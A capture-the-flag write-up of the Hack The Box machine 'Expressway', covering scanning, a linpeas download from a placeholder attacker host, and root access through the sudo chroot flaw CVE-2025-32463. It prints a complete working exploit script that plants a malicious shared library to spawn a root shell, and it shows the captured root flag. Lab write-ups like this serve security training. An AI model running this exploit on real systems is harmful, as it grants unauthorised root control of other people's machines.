# HTB Expressway — Full Writeup

## Overview

- **Machine Name:** Expressway  
- **Platform:** Hack The Box  
- **Difficulty:** Easy–Medium  
- **OS:** Linux  
- **Objective:** Gain User and Root access  
- **Methodology:** Full attack chain from enumeration → foothold → privilege escalation → root

---

# Attack Chain Summary

```
Reconnaissance
    ↓
Service Enumeration (TCP + UDP)
    ↓
Foothold Discovery
    ↓
Local Enumeration (linpeas, manual enumeration)
    ↓
Sudo Vulnerability Identification
    ↓
CVE‑2025‑32463 Exploitation
    ↓
Root Access
```

---

# Phase 1 — Reconnaissance

## Step 1 — Initial Port Scan (TCP)

```bash
nmap -sC -sV -p- -T4 -oN nmap_full_tcp.txt <TARGET_IP>
```

**Lesson learned:** Never assume TCP is the only attack surface.

---

## Step 2 — UDP Enumeration (Critical Lesson)

```bash
sudo nmap -sU -T4 --top-ports 1000 -oN nmap_udp.txt <TARGET_IP>
```

**Key Lesson:** UDP often exposes hidden services missed in TCP scans.

---

# Phase 2 — Foothold

User shell obtained:

```bash
whoami
ike
```

---

# Phase 3 — Local Enumeration

## Tool: linpeas

```bash
wget http://<ATTACKER_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Revealed critical info: SUID binaries, sudo version, writable paths, privilege escalation vectors.

## Manual Enumeration

Check sudo binary:

```bash
ls -l /usr/local/bin/sudo
```

Check version:

```bash
/usr/local/bin/sudo -V
```

---

# Phase 4 — Vulnerability Research

Search for exploits:

```bash
sudo 1.9.17 exploit
sudo privilege escalation CVE
```

Identified CVE‑2025‑32463: local privilege escalation via sudo chroot.

---

# Phase 5 — Exploitation

Exploit script:

```bash
#!/bin/bash
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

cat > woot1337.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash",NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc

gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

sudo -R woot woot

rm -rf "$STAGE"
```

Execute:

```bash
chmod +x exploit.sh
./exploit.sh
```

---

# Root Access

```bash
whoami
root
```

Root flag:

```bash
cat /root/root.txt
b726478a840bcd8dd3822460c5b9369a
```

---

# Key Lessons Learned

1. Always enumerate UDP when TCP fails.  
2. Always run linpeas for local enumeration.  
3. Always check sudo version for vulnerabilities.  
4. CVE research is critical for privilege escalation.

---

# Tools Added to BerserkerToolkit

## Enumeration
```
nmap
linpeas
pspy
netstat
ss
```

## Exploitation
```
gcc
searchsploit
wget
curl
```

## Privilege Escalation
```
linpeas
sudo -V
find / -perm -4000
```

---

# Methodology Upgrade

```
1 Recon
2 TCP scan
3 UDP scan
4 Enumeration
5 Foothold
6 linpeas
7 Version enumeration
8 CVE research
9 Exploit
10 Root
```

---

# Final Result

| Access | Status |
|------|--------|
| User | Compromised |
| Root | Compromised |
| System | Fully owned |

---

# Conclusion

Expressway reinforced the importance of: TCP + UDP enumeration, proper local enumeration, sudo vulnerability research, CVE exploitation, and a systematic approach to privilege escalation.

